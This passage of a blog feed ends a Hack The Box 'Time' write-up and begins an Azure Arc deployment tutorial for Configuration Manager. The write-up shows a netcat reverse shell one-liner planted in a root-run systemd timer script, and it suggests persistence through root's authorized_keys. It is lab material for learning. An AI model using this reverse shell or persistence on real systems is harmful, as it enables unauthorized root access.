&lt;p&gt;This file is configured as a &lt;strong&gt;system timer&lt;/strong&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/systemd/system/timer_backup.timer&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/systemd/system/timer_backup.service&lt;/code&gt;) and set be executed &lt;strong&gt;every 10 seconds&lt;/strong&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As we have enough permissions to edit the shell script, I have added the line below to return a reverse shell on the attacker machine and, after a few seconds, a reverse shell was obtained! :smile:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/g&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/g&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/g|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/g
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As the process is re-executed every 10 sec the process tree is terminated, and we lose the existing connection to the machine. To just get the root flag this time is sufficient, which was as done initially.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.10] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.214] 33304
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
&amp;lt;redacted&amp;gt;
#      
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In case you want to get a persistent connection at this machine we have two initial options:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Configure the system timer to add the public key in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/authorized_keys&lt;/code&gt; file, allowing us to SSH as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Spawn another reverse shell as soon as we get the initial connection, which can be done in multiple ways like Metasploit AutoRunScript and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat&lt;/code&gt;, prepending the listener with the instruction to send the payload as soon as it gets connected, as you can see an example below where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; command is executed as soon as the session is started:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;id&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I hope this was useful to you and see you guys in the next post! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Hello everyone! The machine of this week will be Time, another Linux box medium rated from Hack The Box, created by egotisticalSW and felamos.</summary></entry><entry><title type="html">Azure Arc enabled Servers: Deployment and Update using Configuration Manager</title><link href="https://davicruz.com/azure-arc/2021/04/install-update-azure-arc-windows-configmgr/" rel="alternate" type="text/html" title="Azure Arc enabled Servers: Deployment and Update using Configuration Manager" /><published>2021-04-01T09:00:00-03:00</published><updated>2021-04-01T09:00:00-03:00</updated><id>https://davicruz.com/azure-arc/2021/04/install-update-azure-arc-windows-configmgr</id><content type="html" xml:base="https://davicruz.com/azure-arc/2021/04/install-update-azure-arc-windows-configmgr/">&lt;p&gt;In this post I’ll be guiding you through the process of deploying and updating Azure Arc for Servers (Windows) via Microsoft Endpoint Manager Configuration Manager - MECM (aka SCCM).&lt;/p&gt;

&lt;p&gt;The process is pretty simple, but some small tips are shared to help you to take the most of this powerful configuration management solution for this task :smile:.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Note&lt;/strong&gt;: The scripts shared in this post can also be used from other configuration management tools, but they might require some changes to work.&lt;/p&gt;

&lt;h2 id=&quot;azure-arc-enabled-servers&quot;&gt;Azure Arc enabled Servers&lt;/h2&gt;

&lt;p&gt;Azure Arc allows the management of physical and virtual servers not hosted on Azure to be managed though the Azure Portal console, allowing you to manage extensions, updates, and guest policies in a consistent manner, just like you can do for native Azure Virtual Machines.&lt;/p&gt;

&lt;p&gt;Azure Arc is an important asset so you can benefit from features like Azure Defender Vulnerability Assessment, as well as deploying and managing other extensions like Microsoft Monitoring Agent (MMA) e the new Azure Monitor Agent (AMA).&lt;/p&gt;

&lt;h3 id=&quot;pricing&quot;&gt;Pricing&lt;/h3&gt;

&lt;p&gt;According to &lt;a href=&quot;https://azure.microsoft.com/en-us/pricing/details/azure-arc/&quot;&gt;Azure Arc – Azure Management | Microsoft Azure&lt;/a&gt;, features related to Azure control plane (installing extensions, ARM Templates, etc.) &lt;strong&gt;can be used at no cost&lt;/strong&gt;, as well as the Azure Update Management.&lt;/p&gt;

&lt;p&gt;Features related to Azure Policy Guest Configurations (Automation, Inventory, State Configuration) and other services you may be able to connect to using Arc (Azure Defender and Azure Monitor, for example) are charged according to its respective pricing table, which can be checked directly from &lt;a href=&quot;https://azure.microsoft.com/en-us/pricing/calculator/&quot;&gt;Azure Pricing Calculator&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;pre-requisites&quot;&gt;Pre-requisites&lt;/h3&gt;

&lt;p&gt;Some pre-requisites need to be observed to make this install possible, where details can be check on the link &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/agent-overview#prerequisites&quot;&gt;Overview of the Connected Machine agent - Azure Arc | Microsoft Docs&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A supported Operating System.&lt;/li&gt;
  &lt;li&gt;Azure Arc URLs allowed for communication, vide above mentioned link
    &lt;ul&gt;
      &lt;li&gt;Depending on your environment, defining a proxy server might be required.&lt;/li&gt;
      &lt;li&gt;Some extensions you install from Arc might need additional URLs to ensure their proper functioning.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Provisioning of a Service Principal to onboard clients to Arc silently. Details of how to provision this object is described in &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-service-principal&quot;&gt;Connect hybrid machines to Azure at scale - Azure Arc | Microsoft Docs&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Enable &lt;strong&gt;Microsoft.HybridCompute&lt;/strong&gt; and &lt;strong&gt;Microsoft.GuestConfiguration&lt;/strong&gt; resource providers, according to &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/learn/quick-enable-hybrid-vm#register-azure-resource-providers&quot;&gt;Connect hybrid machine with Azure Arc enabled servers - Azure Arc | Microsoft Docs&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;management-via-configuration-manager&quot;&gt;Management via Configuration Manager&lt;/h2&gt;

&lt;p&gt;If your organization already uses Configuration Manager for device management, it can be also used to install and update Azure Machine Connected Agent, which is used by Azure Arc.&lt;/p&gt;

&lt;h3 id=&quot;agent-install&quot;&gt;Agent Install&lt;/h3&gt;

&lt;p&gt;Using &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/apps/deploy-use/create-applications&quot;&gt;Configuration Manager Applications&lt;/a&gt;, we can ensure that this agent is installed properly in the devices we aim to manage, getting a better control of the results of the install process.&lt;/p&gt;

&lt;p&gt;Below I describe de instructions on how to create this resource:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Download the latest release of Arc installer for Windows: The binary can be downloaded directly from the shortened URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://aka.ms/AzureConnectedMachineAgent&lt;/code&gt;. Powershell command below can be used to download and store it to a specified location.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;The file needs to be stored in a File Share accessible by MECM to be used as content source.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\path\to\file&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;https://aka.ms/AzureConnectedMachineAgent&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$destinationPath&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\AzureConnectedMachineAgent.msi&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Download and edit the &lt;a href=&quot;https://github.com/davi-cruz/Security/blob/main/AzureArc/Windows/Install-AzureArcMECM.ps1&quot;&gt;Install-AzureArcMECM.ps1&lt;/a&gt; script filling the variables just like the sample below. This script needs to be placed in the same directory as the *.msi we’ve just downloaded.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;If your servers require a proxy for Internet communication, fill the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$proxyUrl&lt;/code&gt; with its path, otherwise leave it &lt;strong&gt;blank&lt;/strong&gt;.&lt;/li&gt;
      &lt;li&gt;The shared script, besides installing the agent, also configures proxy (if informed) and connects the agent to Arc service using the credentials specified:&lt;/li&gt;
    &lt;/ul&gt;

    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## Variables&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$installLogFile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c:\Windows\Temp\AzureArcSetup.log&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tenantID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;7482a3c1-7102-4a0d-9dfb-0aa2186ce450&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$subscriptionID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;48a0ab65-bd82-4aac-9283-99344f387d9b&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ResourceGroupName&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rg-azurearc-windows&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$serviceprincipalAppID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;909e06f7-577c-45b9-b49e-eff9e6560ef6&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$serviceprincipalSecret&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f53f0a59-6db3-4ac7-b861-e760d29240d8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$resourceLocation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;eastus&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$proxyUrl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Format: http[s]://server.fqdn:port&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  
&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;### Sample data provided for illustration purposes&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Create the Application from MECM console accessing &lt;em&gt;Software Library&lt;/em&gt; &amp;gt; &lt;em&gt;Application Management&lt;/em&gt; &amp;gt; &lt;em&gt;Applications&lt;/em&gt; and selecting the option &lt;em&gt;Create Application&lt;/em&gt; in the ribbon or on context menu from &lt;em&gt;Application&lt;/em&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UTfhvOv.png&quot; alt=&quot;Creating an Application on MECM&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Select the UNC path for the downloaded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.msi&lt;/code&gt; and click &lt;em&gt;Next&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dE4HPPW.png&quot; alt=&quot;Create Application Wizard - General&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Click &lt;em&gt;Next&lt;/em&gt; to proceed after validating the information shown about the installer used.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/RIHhWc0.png&quot; alt=&quot;Create Application Wizard - Important Information&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;In &lt;em&gt;General Information&lt;/em&gt;, replace the preconfigured command line with the one provided below, so the install process will happen from PowerShell and hit &lt;em&gt;Next&lt;/em&gt;.&lt;/p&gt;

    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%windir%&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indowsPowerShell&lt;span class=&quot;se&quot;&gt;\v&lt;/span&gt;1.0&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;owershell.exe &lt;span class=&quot;nt&quot;&gt;-File&lt;/span&gt; .&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;nstall-AzureArcMECM.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p class=&quot;notice--primary&quot;&gt;:bulb: &lt;strong&gt;Tip&lt;/strong&gt;: Fill in the other requested information for this application, which will enrich the application catalog and make it easier to administer it later.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/V6qUH4B.png&quot; alt=&quot;Create Application Wizard - General Information&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Review all the provided information and click &lt;em&gt;Next&lt;/em&gt; to create the resource.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/tYcMhvu.png&quot; alt=&quot;Create Application Wizard - Summary&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;After completion, the select &lt;em&gt;Close&lt;/em&gt; for this success message.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/93fBtqs.png&quot; alt=&quot;Create Application Wizard - Completion&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After creating this application, we need to adjust a few details so it can work in a more adequate way:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access the deployment type settings by navigating to the application &amp;gt; &lt;em&gt;Deployment Types&lt;/em&gt; tab &amp;gt; right click the existing deployment and select &lt;em&gt;Properties&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/an2pGmr.png&quot; alt=&quot;ConfigMgr Console - Deployment Type Properties&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Under &lt;em&gt;Detection Method&lt;/em&gt; tab, select the option &lt;em&gt;Use a custom script to detect the presence of this deployment type&lt;/em&gt; and click &lt;em&gt;Edit&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QkRIfhc.png&quot; alt=&quot;Deployment Type Properties - Detection Method&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Select the PowerShell script type and paste the snipped provided below, hitting &lt;em&gt;OK&lt;/em&gt; to confirm.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;This detection script will check not only if the agent is installed but also if it’s connected to Arc before and after the install process.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/BWSfWnQ.png&quot; alt=&quot;Detection Method - Script Editor&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;notice--warning&quot;&gt;:warning: &lt;strong&gt;Alert&lt;/strong&gt;: Is important that this script only return an output if the software is installed. Any output is interpreted by ConfigMgr as installed.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Detection Method: Returns the installed version if properly installed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentDetails&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ProgramW6432&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\AzureConnectedMachineAgent\azcmagent.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentStatus&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentDetails&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Where-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-like&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'*Agent Status*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentStatus&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Connected'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Output&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$agentDetails&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Where-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-like&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'*Agent Version*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Returns nothing if not installed&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;On &lt;em&gt;Requirements&lt;/em&gt; tab we need also to define the supported Operating System versions we’re targeting. This also avoids accidental deployments installing Arc Agent on unsupported devices, like Windows Clients.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TMATvrP.png&quot; alt=&quot;Deployment Type Properties - Requirements - Create Requirement&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;After these final adjustments, click &lt;em&gt;OK&lt;/em&gt; to finish the configuration.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At this moment, the Application is ready to be deployed to your servers and the process involved in this task is described in this &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/apps/deploy-use/deploy-applications&quot;&gt;official Microsoft reference&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;updating-the-agent&quot;&gt;Updating the agent&lt;/h3&gt;

&lt;p&gt;According to the &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/manage-agent#upgrading-agent&quot;&gt;docs&lt;/a&gt;, Azure Arc can be updated manually or using WSUS for Windows Operating Systems.&lt;/p&gt;

&lt;p&gt;In this case we can leverage ConfigMgr in both ways:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Creating another application for the newer version&lt;/strong&gt;:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;This mechanism requires more administration effort from ConfigMgr but can be achieved by duplicating the application and replacing the installation binaries.
        &lt;ul&gt;
          &lt;li&gt;If you desire to proceed with this, your detection method will need to be enhanced by looking for a specific Arc Version.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Is also important that, if you go through this path, a &lt;strong&gt;supersedence relation&lt;/strong&gt; be created between these apps, as you can learn more in &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/apps/deploy-use/revise-and-supersede-applications#supersedence&quot;&gt;this link&lt;/a&gt;. It allows that, for the existing deployments of older versions, the latest app available be used, as well as allowing you to set the behavior for the devices where the app already installed, that can be update or uninstall.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
